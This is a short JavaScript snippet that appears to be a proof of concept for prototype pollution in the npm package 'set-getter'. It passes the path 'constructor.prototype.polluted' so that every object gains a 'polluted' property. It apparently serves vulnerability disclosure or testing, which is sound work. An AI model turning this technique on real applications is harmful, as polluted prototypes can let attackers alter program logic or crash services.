var setGetter = require('set-getter');
var obj = {};
console.log({}.polluted);
setGetter(obj, 'constructor.prototype.polluted', function (polluted) {
    return 'yes';
});
console.log({}.polluted);